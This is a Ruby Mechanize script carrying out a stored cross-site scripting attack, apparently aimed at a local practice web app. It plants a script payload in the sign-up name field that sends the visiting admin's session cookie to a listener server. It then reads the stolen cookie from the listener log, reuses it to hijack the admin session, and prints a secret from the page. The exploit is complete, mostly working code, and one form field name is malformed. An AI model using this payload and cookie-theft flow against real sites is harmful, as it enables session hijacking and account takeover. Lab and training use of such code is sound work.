require 'mechanize'

class SimpleListener
  OUT_FILE  = 'tmp/listener.log'

  attr_reader :path

  def initialize
    @path = 'http://localhost:8000/'
  end

  def run
    cmd = "python -m SimpleHTTPServer &> #{OUT_FILE}"
    @pid = Process.spawn(cmd)
  end

  def terminate
    Process.kill(:SIGINT, @pid)
    Process.kill(:SIGINT, @pid + 1)
    clean_up
  end

  def read_logs
    CGI.unescape(File.read(OUT_FILE))
  end

  private

  def clean_up
    @pid = nil
    File.delete(OUT_FILE)
  end
end

# <script>document.write('<img src="http://localhost:8000/output?cookie=' + document.cookie + '"/>');</script>
# Start the server
server = SimpleListener.new
server.run

USER = 'fox@fox1.com'
PASS = '123456789'

Mechanize.new.instance_eval do
  begin
    # Define JS payload
    payload = "<script>document.write('<img src=\"#{server.path}/output?cookie=' + document.cookie + '\"/>');</script>"

    # Sign up and set payload as user name
    get 'http://localhost:3000/users/sign_up'

     page.forms.first.tap do |f|
      f['user[name']                    = payload
      f['user[email]']                  = USER
      f['user[password]']               = PASS
      f['user[password_confirmation]']  = PASS
      f.submit
    end

  # Wait for admin login
  puts '[+] Waiting for admin login...'
  sleep 5

  # Parse the logs for our session_key
  session_key = server.read_logs
                  .match(/\/output\?cookie=_project-amazing_session=(.*) HTTP/)
                  .captures
                  .first

  puts '[+] Found the admin cookie...'

  # Set the session_key cookie in our jar
  cookie_jar.clear!
  cookie = Mechanize::Cookie.new('_project-amazing_session', session_key).tap do |c|
    c.domain = 'localhost:3000'
    c.path   = '/'
  end
  cookie_jar.add('http://localhost:3000/', cookie)

  # Visit the homepage and read the secret
  get '/'
  puts '[+] Success'
  puts page.search('.secret').text.strip

  rescue  
  ensure
    # Kill the server process
    server.terminate
  end
end
 